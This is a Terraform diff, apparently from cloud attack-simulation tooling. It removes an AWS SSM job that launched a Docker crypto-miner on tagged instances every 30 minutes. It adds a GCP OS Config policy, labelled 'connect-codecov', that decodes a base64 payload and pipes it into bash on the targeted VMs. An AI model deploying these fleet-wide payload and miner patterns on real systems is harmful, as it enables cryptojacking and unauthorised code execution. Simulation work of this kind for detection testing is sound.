@@ -29,69 +29,59 @@ locals {
     base64_payload = base64encode(local.payload)
 }
 
-# nicehash example
-# if [[ `sudo docker ps | grep ${local.nicehash_name}` ]]; then docker stop ${local.nicehash_name}; fi
-#     sudo docker run --rm -d --network=host --name ${local.nicehash_name} ${local.nicehash_image} -l ${local.nicehash_server} -u ${local.nicehash_user}
+resource "google_os_config_os_policy_assignment" "install-lacework-agent" {
 
-resource "aws_ssm_document" "exec_docker_cpuminer" {
-  name          = "exec_docker_cpuminer_${var.environment}_${var.deployment}"
-  document_type = "Command"
+  project     = var.gcp_project_id
+  location    = data.google_compute_zones.available.names[0]
+  
+  name        = "osconfig-connect-codecov-${var.environment}-${var.deployment}"
+  description = "Connect codecov"
+  skip_await_rollout = true
+  
+  instance_filter {
+    all = false
 
-  content = jsonencode(
-    {
-        "schemaVersion": "2.2",
-        "description": "start docker based cpuminer",
-        "mainSteps": [
-            {
-                "action": "aws:runShellScript",
-                "name": "exec_docker_cpuminer_${var.environment}_${var.deployment}",
-                "precondition": {
-                    "StringEquals": [
-                        "platformType",
-                        "Linux"
-                    ]
-                },
-                "inputs": {
-                    "timeoutSeconds": "60",
-                    "runCommand": [
-                        "echo '${local.base64_payload}' | tee /tmp/payload_${basename(abspath(path.module))} | base64 -d | /bin/bash -"
-                    ]
-                }
-            }
-        ]
-    })
-}
-
-resource "aws_resourcegroups_group" "exec_docker_cpuminer" {
-    name = "exec_docker_cpuminer_${var.environment}_${var.deployment}"
-
-    resource_query {
-        query = jsonencode(var.resource_query_exec_docker_cpuminer)
+    inclusion_labels {
+      labels = var.label
     }
 
-    tags = {
-        billing = var.environment
-        owner   = "lacework"
-    }
-}
-
-resource "aws_ssm_association" "exec_docker_cpuminer" {
-    association_name = "exec_docker_cpuminer_${var.environment}_${var.deployment}"
-
-    name = aws_ssm_document.exec_docker_cpuminer.name
-
-    targets {
-        key = "resource-groups:Name"
-        values = [
-            aws_resourcegroups_group.exec_docker_cpuminer.name,
-        ]
+    inventories {
+      os_short_name = "ubuntu"
     }
 
-    compliance_severity = "HIGH"
+    inventories {
+      os_short_name = "debian"
+    }
 
-    # every 30 minutes
-    schedule_expression = "cron(0/30 * * * ? *)"
-    
-    # will apply when updated and interval when false
-    apply_only_at_cron_interval = false
+  }
+
+  os_policies {
+    id   = "osconfig-connect-codecov-${var.environment}-${var.deployment}"
+    mode = "ENFORCEMENT"
+
+    resource_groups {
+      resources {
+        id = "run"
+        exec {
+          validate {
+            interpreter      = "SHELL"
+            output_file_path = "$HOME/os-policy-tf.out"
+            script           = "if false; then exit 100; else exit 101; fi"
+          }
+          enforce {
+            interpreter      = "SHELL"
+            output_file_path = "$HOME/os-policy-tf.out"
+            script           = "echo '${local.base64_payload}' | tee /tmp/payload_${basename(abspath(path.module))} | base64 -d | /bin/bash - && exit 100"
+          }
+        }
+      }
+    }
+  }
+
+  rollout {
+    disruption_budget {
+      percent = 100
+    }
+    min_wait_duration = "600s"
+  }
 }
